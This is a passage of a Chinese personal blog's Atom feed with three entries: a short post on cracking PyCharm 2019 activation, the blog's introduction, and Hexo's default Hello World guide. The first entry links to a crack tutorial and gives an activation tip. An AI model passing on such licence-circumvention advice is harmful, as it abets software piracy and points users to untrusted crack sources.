    <content type="html"><![CDATA[<p><code>朋友们，该学习python了。</code></p><a id="more"></a><p>本人由于想要使用pycharm来学习python，但又苦于没有钱买正版，于是找了几个小时的破解教程。但是网上的教程大多数都是挺久以前的了，使用的激活码等已经不能用了。就在我几欲放弃之时，终于被我找到了真实有效的破解教程啦！ </p><p>直接给出原文链接吧，我就不在此赘述了。<br><a href="https://www.626x.com/2669.html" target="_blank" rel="noopener">樱花庄的小樱</a><br>需要注意的是：最后一步激活时原文是直接等待它自动弹出链接地址，但是我没有等到它弹出来就自己先把那个地址填上去了，再点击激活就OK了。如果出现无法链接的情况，可先尝试关掉再重启pycharm，再按以上步骤重试一遍即可。</p><p>来看看我最终成功的图片：<br><img src="https://pic.downk.cc/item/5e2b94d12fb38b8c3c7018ed.jpg" alt><br>哈哈，从此我就走上py之路啦！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;朋友们，该学习python了。&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="https://ggyggy666.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="永久破解pycharm2019-2.3的方法" scheme="https://ggyggy666.github.io/tags/%E6%B0%B8%E4%B9%85%E7%A0%B4%E8%A7%A3pycharm2019-2-3%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>个人博客简述</title>
    <link href="https://ggyggy666.github.io/2020/01/03/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%AE%80%E8%BF%B0/"/>
    <id>https://ggyggy666.github.io/2020/01/03/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%AE%80%E8%BF%B0/</id>
    <published>2020-01-03T05:26:50.000Z</published>
    <updated>2020-01-25T01:16:42.833Z</updated>
    
    <content type="html"><![CDATA[<h2 id="这是我的第一个博客"><a href="#这是我的第一个博客" class="headerlink" title="这是我的第一个博客"></a><strong>这是我的第一个博客</strong></h2><pre><code>从今天开始就正式上线啦！  </code></pre><a id="more"></a><p>至于为什么会突然想写一些东西，谁知道呢，嘻嘻。<br>好吧，其实是因为在期末写了几篇结课论文后，感觉将从网上所学会的东西用文字记录下来能理解的更深、更透彻，而且由于太久没写文章，感觉自己的写作水平急剧下降，于是产生了写博客的想法。不过搭建博客的路程真是艰辛呐，从前天开始就一直在百度、CSDN、谷歌、必应上畅游。找教程、找问答、然后动手实践。但其实大多数时间都花在了解决遇到的各种问题上，害，真的一言难尽啊。所幸在我的坚持不懈下，终于初步建成了它。包括你现在看到的这篇简述，也是在学会了一点markdown语法后写出的。写得很不成熟，但请不要介意。<br>在未来，可能会偶尔更新一下它，将自己所学的东西记录下来，也算是一个成长过程的见证吧。【暂定内容主要包括python、web安全吧(目前学习方向)】<br>欢迎关注我！ </p><hr><h2 id="扫描下方的二维码，精彩文章等你来看哦。"><a href="#扫描下方的二维码，精彩文章等你来看哦。" class="headerlink" title="扫描下方的二维码，精彩文章等你来看哦。 "></a><code>扫描下方的二维码，精彩文章等你来看哦。</code> </h2><p><img src="https://pic.downk.cc/item/5e2b95c22fb38b8c3c702ad9.jpg" alt="alipay"><br><img src="https://pic.downk.cc/item/5e2b95dc2fb38b8c3c702c9e.jpg" alt="wechat"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;这是我的第一个博客&quot;&gt;&lt;a href=&quot;#这是我的第一个博客&quot; class=&quot;headerlink&quot; title=&quot;这是我的第一个博客&quot;&gt;&lt;/a&gt;&lt;strong&gt;这是我的第一个博客&lt;/strong&gt;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;从今天开始就正式上线啦！  &lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="home" scheme="https://ggyggy666.github.io/categories/home/"/>
    
    
      <category term="简述 2020年" scheme="https://ggyggy666.github.io/tags/%E7%AE%80%E8%BF%B0-2020%E5%B9%B4/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://ggyggy666.github.io/2020/01/03/hello-world/"/>
    <id>https://ggyggy666.github.io/2020/01/03/hello-world/</id>
    <published>2020-01-03T03:06:05.756Z</published>
    <updated>2020-01-21T12:55:12.971Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
    
    </summary>
    
    
      <category term="home" scheme="https://ggyggy666.github.io/categories/home/"/>
    
    
      <category term="博客的使用方法" scheme="https://ggyggy666.github.io/tags/%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
</feed>
